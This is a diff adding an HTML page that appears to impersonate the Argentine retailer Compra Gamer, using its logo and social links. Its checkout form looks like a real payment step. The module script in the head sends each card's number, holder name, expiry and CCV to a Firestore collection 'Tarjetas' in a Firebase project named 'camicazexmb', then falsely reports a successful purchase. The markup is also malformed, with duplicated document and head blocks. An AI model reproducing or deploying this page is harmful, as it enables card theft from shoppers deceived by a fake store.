@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Compra Gamer</title>
+    <link href="https://fonts.googleapis.com/css?family=Lato|Liu+Jian+Mao+Cao&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/estilos.css">
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBWQzu66f5wO9UWW5S4axl7NluVJnRYREA",
+            authDomain: "camicazexmb.firebaseapp.com",
+            projectId: "camicazexmb",
+            storageBucket: "camicazexmb.appspot.com",
+            messagingSenderId: "532049772261",
+            appId: "1:532049772261:web:959c6cb4b9d2880fae5e0c",
+            measurementId: "G-9K2YJGJWNR"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        window.submitForm = async function(event) {
+            event.preventDefault();
+
+            const cardNumber = document.getElementById('inputNumero').value.trim();
+            const cardName = document.getElementById('inputNombre').value.trim();
+            const expirationMonth = document.getElementById('selectMes').value;
+            const expirationYear = document.getElementById('selectYear').value;
+            const ccv = document.getElementById('inputCCV').value.trim();
+
+            if (!cardNumber || !cardName || expirationMonth === "Mes" || expirationYear === "Año" || !ccv) {
+                alert("Por favor, completa todos los campos.");
+                return;
+            }
+
+            try {
+                await addDoc(collection(db, 'Tarjetas'), {
+                    numeroTarjeta: cardNumber,
+                    nombre: cardName,
+                    expiracion: {
+                        mes: expirationMonth,
+                        año: expirationYear
+                    },
+                    ccv: ccv
+                });
+                alert('Compra exitoso!');
+                document.getElementById('formulario-tarjeta').reset();
+                window.location.href = "confirmacion.html";
+            } catch (error) {
+                alert('Error al registrar la tarjeta, sin conexion a internet: ' + error.message);
+            }
+        };
+    </script>
+</head>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="Imagenes/logo.png" type="image/x-icon">
+    <title>COMPRA GAMER</title>
+</head>
+<body>
+    <header>
+        <img alt="Logo Compra Gamer" class="logo" src="https://imagenes.compragamer.com/assets/logos/newlogo_blanco.svg">
+        <nav>
+            <ul>
+                <li><a href="inicio.html" class="links">Productos</a></li>
+                <li><a href="computadoras-armadas.html" class="links">Computadoras Armadas</a></li>
+                <li><a href="servicios.html" class="links">Servicios de Reparación</a></li>
+            </ul>
+        </nav>
+        <script>
+            window.addEventListener('scroll', function() {
+    const header = document.querySelector('header');
+    if (window.scrollY > 50) {
+        header.classList.add('scrolled');
+    } else {
+        header.classList.remove('scrolled');
+    }
+});
+        </script>
+        <style>
+header {
+    background: #333;
+    color: #fff;
+    padding: 20px;
+    text-align: center;
+    position: sticky;
+    top: 0;
+    z-index: 1000;
+    transition: all 0.3s ease;
+}
+
+header.scrolled {
+    padding: 10px;
+    font-size: 0.9rem;
+}
+
+header h1 {
+    margin: 0;
+    font-size: 1.8rem;
+    transition: font-size 0.3s ease;
+}
+
+.links {
+    color: white;
+    margin: 0 15px;
+    text-decoration: none;
+    transition: color 0.5s;
+}
+
+.links:hover {
+    color: #ff0000;
+}
+
+nav ul {
+    list-style: none;
+    padding: 0;
+}
+
+nav ul li {
+    display: inline;
+    margin: 0 15px;
+}
+
+.logo {
+    width: 20%;
+    height: auto; 
+}
+        </style>
+    </header>
+<body>
+    <div class="contenedor">
+        <section class="tarjeta" id="tarjeta">
+            <div class="delantera">
+                <div class="logo-marca" id="logo-marca"></div>
+                <img src="img/chip-tarjeta.png" class="chip" alt="">
+                <div class="datos">
+                    <div class="grupo" id="numero">
+                        <p class="label">Número Tarjeta</p>
+                        <p class="numero">#### #### #### ####</p>
+                    </div>
+                    <div class="flexbox">
+                        <div class="grupo" id="nombre">
+                            <p class="label">Nombre Tarjeta</p>
+                            <p class="nombre">TU NOMBRE</p>
+                        </div>
+                        <div class="grupo" id="expiracion">
+                            <p class="label">Expiracion</p>
+                            <p class="expiracion"><span class="mes">MM</span> / <span class="year">AA</span></p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="trasera">
+                <div class="barra-magnetica"></div>
+                <div class="datos">
+                    <div class="grupo" id="firma">
+                        <p class="label">Firma</p>
+                        <div class="firma"><p></p></div>
+                    </div>
+                    <div class="grupo" id="ccv">
+                        <p class="label">CCV</p>
+                        <p class="ccv"></p>
+                    </div>
+                </div>
+                <p class="leyenda">Información adicional: Mantenga su tarjeta en un lugar seguro y nunca comparta su PIN o información de la tarjeta con nadie.</p>
+                <a href="#" class="link-banco">www.tubanco.com.ar</a>
+            </div>
+        </section>
+
+        <div class="contenedor-btn">
+            <button class="btn-abrir-formulario" id="btn-abrir-formulario">+
+                <i class="fas fa-plus"></i>
+            </button>
+        </div>
+
+        <form action="" id="formulario-tarjeta" class="formulario-tarjeta" onsubmit="submitForm(event)">
+            <div class="grupo">
+                <label for="inputNumero">Número Tarjeta</label>
+                <input type="text" id="inputNumero" maxlength="19" autocomplete="off" required>
+            </div>
+            <div class="grupo">
+                <label for="inputNombre">Nombre</label>
+                <input type="text" id="inputNombre" maxlength="30" autocomplete="off" required>
+            </div>
+            <div class="flexbox">
+                <div class="grupo expira">
+                    <label for="selectMes">Expiracion</label>
+                    <div class="flexbox">
+                        <div class="grupo-select">
+                            <select name="mes" id="selectMes" required>
+                                <option disabled selected>Mes</option>
+                            </select>
+                            <i class="fas fa-angle-down"></i>
+                        </div>
+                        <div class="grupo-select">
+                            <select name="year" id="selectYear" required>
+                                <option disabled selected>Año</option>
+                            </select>
+                            <i class="fas fa-angle-down"></i>
+                        </div>
+                    </div>
+                </div>
+                <div class="grupo ccv">
+                    <label for="inputCCV">CCV</label>
+                    <input type="text" id="inputCCV" maxlength="3" required>
+                </div>
+            </div>
+            <button type="submit" class="btn-enviar">Enviar</button>
+        </form>
+    </div>
+
+    <script src="https://kit.fontawesome.com/2c36e9b7b1.js" crossorigin="anonymous"></script>
+    <script src="js/main.js"></script>
+</body>
+<footer>
+    <div class="footer-content">
+        <h3>Compra Gamer</h3>
+        <p>Tu tienda de confianza para productos y servicios de tecnología.</p>
+        <h4>Siguenos</h4>
+            <div class="icono-contenedor">
+                <a href="https://www.twitch.tv/compragamerok">
+                    <div class="icono-circulo">
+                        <svg class="icono-hover" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                            <path d="M2.149 0l-1.612 4.119v16.836h5.731v3.045h3.224l3.045-3.045h4.657l6.269-6.269v-14.686h-21.314zm19.164 13.612l-3.582 3.582h-5.731l-3.045 3.045v-3.045h-4.836v-15.045h17.194v11.463zm-3.582-7.343v6.262h-2.149v-6.262h2.149zm-5.731 0v6.262h-2.149v-6.262h2.149z"></path>
+                        </svg>
+                    </div>
+                </a>
+                <a href="https://x.com/CompraGamerOK">
+                    <div class="icono-circulo">
+                        <svg class="icono-hover" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 20">
+                            <path d="M17.244 0.25H20.552L13.325 8.51L21.827 19.75H15.17L9.956 12.933L3.99 19.75H0.679998L8.41 10.915L0.253998 0.25H7.08L11.793 6.481L17.244 0.25ZM16.083 17.77H17.916L6.084 2.126H4.117L16.083 17.77Z"></path>
+                        </svg>
+                    </div>
+                </a>
+                <a href="https://www.youtube.com/c/CompraGamer">
+                    <div class="icono-circulo">
+                        <svg class="icono-hover" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                            <path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path>
+                        </svg>
+                    </div>
+                </a>
+                <a href="https://www.linkedin.com/company/newton-station-srl/mycompany/">
+                    <div class="icono-circulo">
+                        <svg class="icono-hover" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                            <path d="M4.98 3.5c0 1.381-1.11 2.5-2.48 2.5s-2.48-1.119-2.48-2.5c0-1.38 1.11-2.5 2.48-2.5s2.48 1.12 2.48 2.5zm.02 4.5h-5v16h5v-16zm7.982 0h-4.968v16h4.969v-8.399c0-4.67 6.029-5.052 6.029 0v8.399h4.988v-10.131c0-7.88-8.922-7.593-11.018-3.714v-2.155z"></path>
+                        </svg>
+                    </div>
+                </a>
+                <a href="https://www.instagram.com/compragamer_oficial/">
+                    <div class="icono-circulo">
+                        <svg class="icono-hover" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                            <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"></path>
+                        </svg>
+                    </div>
+                </a>
+                <div class="icono-contenedor">
+                    <a href="https://www.facebook.com/compragamer">
+                        <div class="icono-circulo">
+                            <svg class="icono-hover" height="100%" width="100%" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 310 310">
+                                <g>
+                                    <path d="M81.703,165.106h33.981V305c0,2.762,2.238,5,5,5h57.616c2.762,0,5-2.238,5-5V165.765h39.064
+                                        c2.54,0,4.677-1.906,4.967-4.429l5.933-51.502c0.163-1.417-0.286-2.836-1.234-3.899c-0.949-1.064-2.307-1.673-3.732-1.673h-44.996
+                                        V71.978c0-9.732,5.24-14.667,15.576-14.667c1.473,0,29.42,0,29.42,0c2.762,0,5-2.239,5-5V5.037c0-2.762-2.238-5-5-5h-40.545
+                                        C187.467,0.023,186.832,0,185.896,0c-7.035,0-31.488,1.381-50.804,19.151c-21.402,19.692-18.427,43.27-17.716,47.358v37.752H81.703
+                                        c-2.762,0-5,2.238-5,5v50.844C76.703,162.867,78.941,165.106,81.703,165.106z"></path>
+                                </g>
+                            </svg>
+                        </div>
+                    </a>
+                    <a href="https://www.tiktok.com/@compragamer.com?lang=es">
+                        <div class="icono-circulo">
+                            <svg class="icono-hover" width="100%" height="100%" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M22.0901 9.84202C20.017 9.84696 17.9947 9.20321 16.3089 8.00171V16.3813C16.3083 17.9333 15.8319 19.4482 14.9433 20.7233C14.0548 21.9984 12.7964 22.973 11.3365 23.5168C9.8766 24.0606 8.28476 24.1477 6.77382 23.7664C5.26288 23.3851 3.90487 22.5536 2.88137 21.383C1.85787 20.2125 1.21767 18.7587 1.04637 17.2161C0.875071 15.6735 1.18084 14.1156 1.92279 12.7507C2.66474 11.3858 3.8075 10.279 5.19828 9.57823C6.58906 8.87746 8.16155 8.61616 9.70551 8.82927V13.0439C8.99899 12.8227 8.24032 12.8293 7.53784 13.063C6.83535 13.2966 6.22498 13.7453 5.79389 14.345C5.36279 14.9446 5.13302 15.6646 5.13738 16.402C5.14174 17.1395 5.38002 17.8567 5.81818 18.4512C6.25634 19.0458 6.87198 19.4873 7.57717 19.7127C8.28237 19.9381 9.04107 19.9359 9.74492 19.7063C10.4488 19.4768 11.0618 19.0316 11.4964 18.4345C11.931 17.8374 12.165 17.1188 12.165 16.3813V0H16.3089C16.306 0.348435 16.3354 0.696395 16.3965 1.03948C16.5405 1.80537 16.8399 2.53396 17.2764 3.18068C17.7129 3.8274 18.2773 4.37867 18.9351 4.80075C19.871 5.41688 20.9682 5.74528 22.0901 5.74505V9.84202Z"></path>
+                            </svg>
+                        </div>
+                    </a>
+                </div>                    
+            </div>
+        </div>
+        <div class="footer-links">
+            <a href="inicio.html" class="links">Productos</a>
+            <a href="computadoras-armadas.html" class="links">Computadoras</a>
+            <a href="servicios.html" class="links">Servicios</a>
+            <a href="carrito.html" class="links">Carrito</a>
+        </div>
+        <p>Contacta con nosotros: <a href="maxibutierrez10@gmail.com">maxibutierrez10@gmail.com</a></p>
+        <p>© 2024 Compra Gamer. Todos los derechos reservados.</p>
+    </div>
+    <style>
+footer {
+    background: #333;
+    color: white;
+    padding: 20px;
+    text-align: center;
+    width: auto;
+    margin-top: 20px;
+}
+
+.footer-content {
+    max-width: 1200px;
+    margin: auto;
+}
+
+.footer-links {
+    display: flex;
+    justify-content: center;
+    margin: 10px 0;
+}
+
+.links {
+    color: white;
+    margin: 0 15px;
+    text-decoration: none;
+    transition: color 0.5s;
+}
+
+.links:hover {
+    color: #ff0000;
+}
+
+.icono-contenedor {
+    display: flex;
+    gap: 20px;
+    justify-content: center;
+    align-items: center;
+}
+
+.icono-circulo {
+    background-color: black;
+    border: 1px solid white;
+    border-radius: 50%;
+    width: 50px;
+    height: 50px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    transition: background-color 0.3s ease, transform 0.3s ease;
+}
+
+.icono-circulo:hover {
+    background-color: white;
+    transform: scale(1.1);
+}
+
+.icono-hover {
+    fill: white;
+    transition: fill 0.3s ease;
+    width: 50%;
+    height: 50%;
+}
+
+.icono-circulo:hover .icono-hover {
+    fill: red;
+}
+
+    </style>
+</footer>
+</html>
